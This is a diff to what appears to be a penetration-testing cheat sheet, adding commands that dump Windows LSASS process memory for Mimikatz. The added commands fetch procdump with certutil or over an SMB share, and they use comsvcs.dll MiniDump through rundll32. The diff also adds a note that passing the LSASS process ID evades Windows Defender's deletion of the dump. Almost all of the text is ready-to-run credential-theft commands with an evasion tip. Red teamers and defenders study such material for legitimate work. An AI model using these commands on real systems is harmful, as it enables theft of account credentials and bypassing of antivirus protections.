@@ -61,17 +61,28 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 
 ## Mimikatz - Mini Dump
 
-Dump the lsass process.
+Dump the lsass process with `procdump`
+
+> Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) "bypasses" that.
 
 ```powershell
-# HTTP method
+# HTTP method - using the default way
 certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
 C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
-# SMB method
+# SMB method - using the pid
 net use Z: https://live.sysinternals.com
-Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+tasklist /fi "imagename eq lsass.exe" # Find lsass's pid
+Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
 ```
+
+Dump the lsass process with `rundll32`
+
+```powershell
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
+```
+
+
 
 Then load it inside Mimikatz.
 
